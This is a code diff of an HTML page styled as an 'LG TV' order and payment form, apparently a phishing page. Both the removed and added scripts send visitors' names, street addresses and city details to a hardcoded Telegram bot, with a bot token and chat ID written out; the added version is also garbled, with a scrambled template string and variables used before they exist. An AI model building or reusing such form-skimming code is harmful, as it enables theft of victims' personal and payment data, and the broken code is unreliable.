@@ -522,32 +522,18 @@
         </form>
     </div>
 
-    <!-- Script لإرسال البيانات إلى التلغرام -->
-    <script>
-        
- const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-            const chatId = '5372119436'; // Votre chat ID Telegram
+        // Fonction pour envoyer les informations au bot Telegram
+        document.getElementById('payment-form').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Eviter l'envoi du formulaire
 
-        // إرسال البيانات إلى تلغرام
-        function sendToTelegram(data) {
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            const message = `
-                🌟 طلب جديد 🌟
+            🌟 طلب جديد 🌟
                 👤 الاسم: ${data.nom} ${data.prenom}
                 🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
             `;
-            return fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
-            });
-        }
 
-        // منع الإرسال الافتراضي وإضافة إرسال التلغرام
-        document.getElementById("order-form").addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            const data = {
+            // Créez un message à envoyer
+            const message = `
+const data = {
                 prenom: document.getElementById("prenom").value,
                 nom: document.getElementById("nom").value,
                 rue: document.getElementById("rue").value,
@@ -556,24 +542,22 @@
                 ville: document.getElementById("ville").value,
             };
 
-            sendToTelegram(data)
-                .then(response => {
-                    if (response.ok) {
-                        this.submit(); // إعادة التوجيه بعد الإرسال
-                    } else {
-                        alert("حدث خطأ أثناء إرسال البيانات إلى تلغرام.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
-                });
+            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+            const chatId = '5372119436'; // Votre chat ID Telegram
+
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Envoi du message
+            const response = await fetch(telegramApiUrl);
+            const dataResponse = await response.json();
+
+            if (dataResponse.ok) {
+                alert('Votre paiement a été envoyé avec succès.');
+            } else {
+                alert('Erreur dans l\'envoi des informations.');
+            }
         });
     </script>
 
-    <!-- Footer -->
-    <footer>
-        <p>&copy; 2025 LG TV. Tous droits réservés.</p>
-    </footer>
 </body>
 </html>
